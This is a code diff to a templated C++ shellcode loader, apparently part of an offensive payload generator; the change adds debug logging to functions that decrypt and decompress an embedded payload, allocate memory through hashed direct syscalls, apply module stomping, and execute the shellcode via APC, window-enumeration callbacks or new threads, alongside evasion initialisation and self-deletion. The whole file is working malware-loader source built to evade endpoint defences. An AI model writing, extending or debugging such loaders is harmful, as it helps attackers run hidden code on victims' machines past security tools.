@@ -4,6 +4,14 @@
 #include <winternl.h>
 #include <tlhelp32.h>
 
+{{#IF LOADER_DEBUG}}
+#include <stdio.h>
+#define DBG(fmt, ...) fprintf(stderr, "[DBG] " fmt "\n", ##__VA_ARGS__)
+{{#ENDIF}}
+#ifndef DBG
+#define DBG(fmt, ...)
+#endif
+
 #include "obfuscate.hpp.in"
 #include "api_hashing.hpp.in"
 #include "syscalls.hpp.in"
@@ -144,9 +152,11 @@ static void arm_terminate_hwbp(HANDLE hThread) {
 
 {{#IF LOCAL_INJECT}}
 static void execute_local() {
+    DBG("execute_local: payload_len=%zu", payload_len);
 {{#IF ENTROPY_REDUCE}}
     for (size_t i = 0; i < payload_len; i++)
         payload[i] ^= entropy_mask[i];
+    DBG("entropy mask applied");
 {{#ENDIF}}
 
     // Decode if needed
@@ -182,15 +192,16 @@ static void execute_local() {
     encrypted = decode_buf;
 {{#ENDIF}}
 
+    DBG("decoded: encrypted_len=%zu", encrypted_len);
+
     // Decrypt
     uint8_t decrypted[{{PAYLOAD_SIZE}} + 256];
     size_t decrypted_len = sizeof(decrypted);
     if (!decrypt_payload(encrypted, encrypted_len, key, key_len, decrypted, &decrypted_len)) {
-{{#IF VERBOSE}}
-        // Decryption failed
-{{#ENDIF}}
+        DBG("decrypt_payload FAILED");
         return;
     }
+    DBG("decrypted: %zu bytes", decrypted_len);
 
     // Decompress
     uint8_t* shellcode = decrypted;
@@ -276,10 +287,11 @@ static void execute_local() {
     return;
 {{#ENDIF}}
 
+    DBG("shellcode ready: %zu bytes", shellcode_len);
     HANDLE hProc = GetCurrentProcess();
     PVOID exec_addr = nullptr;
     auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
-    if (!NtPVM) return;
+    if (!NtPVM) { DBG("NtProtectVirtualMemory resolve FAILED"); return; }
 
 {{#IF MODULE_STOMP}}
     // Module Stomping: load a sacrificial DLL, overwrite its .text section
@@ -340,11 +352,12 @@ static void execute_local() {
     SIZE_T region_size = shellcode_len;
 
     auto NtAVM = get_syscall_fn<NtAllocateVirtualMemory_t>(HASH_NtAllocateVirtualMemory);
-    if (!NtAVM) return;
+    if (!NtAVM) { DBG("NtAllocateVirtualMemory resolve FAILED"); return; }
 
     NTSTATUS status = NtAVM(hProc, &base_addr, 0, &region_size,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (status != 0) return;
+    if (status != 0) { DBG("NtAVM FAILED: 0x%08lx", status); return; }
+    DBG("allocated RW memory at %p (%zu bytes)", base_addr, region_size);
 
 {{#IF DRIP_LOAD}}
     {
@@ -374,6 +387,7 @@ static void execute_local() {
 
 {{#IF EXEC_APC}}
     {
+        DBG("executing via APC at %p", exec_addr);
         auto NtQAT = get_syscall_fn<NtQueueApcThread_t>(HASH_NtQueueApcThread);
         if (!NtQAT) return;
         NtQAT(GetCurrentThread(), exec_addr, NULL, NULL, NULL);
@@ -382,6 +396,7 @@ static void execute_local() {
 {{#ENDIF}}
 
 {{#IF EXEC_CALLBACK}}
+    DBG("executing via callback at %p", exec_addr);
     EnumWindows(reinterpret_cast<WNDENUMPROC>(exec_addr), 0);
 {{#ENDIF}}
 
@@ -419,17 +434,21 @@ static void execute_local() {
 
 {{#IF EXEC_THREAD}}
     {
+        DBG("executing via thread at %p", exec_addr);
         auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
         if (NtCTE) NtCTE(&g_sc_thread, THREAD_ALL_ACCESS, NULL, hProc,
                          exec_addr, NULL, 0x1, 0, 0, 0, NULL);
+        DBG("thread created: handle=%p", g_sc_thread);
     }
 {{#ENDIF}}
 
 {{#IF EXEC_DIRECT}}
     {
+        DBG("executing via suspended thread at %p", exec_addr);
         auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
         if (NtCTE) NtCTE(&g_sc_thread, THREAD_ALL_ACCESS, NULL, hProc,
                          exec_addr, NULL, 0x1, 0, 0, 0, NULL);
+        DBG("thread created: handle=%p", g_sc_thread);
     }
 {{#ENDIF}}
 
@@ -710,14 +729,19 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
 
 {{#IF EXE_ENTRY}}
 int main() {
-    if (!init_syscalls()) return 1;
-    if (!evasion_init()) return 1;
+    DBG("loader started");
+    if (!init_syscalls()) { DBG("init_syscalls FAILED"); return 1; }
+    DBG("syscalls initialized");
+    if (!evasion_init()) { DBG("evasion_init FAILED"); return 1; }
+    DBG("evasion initialized");
 
 {{#IF SELF_DELETE}}
     self_delete();
+    DBG("self-delete triggered");
 {{#ENDIF}}
 
     setup_terminate_guard();
+    DBG("terminate guard armed");
 
 {{#IF LOCAL_INJECT}}
     execute_local();
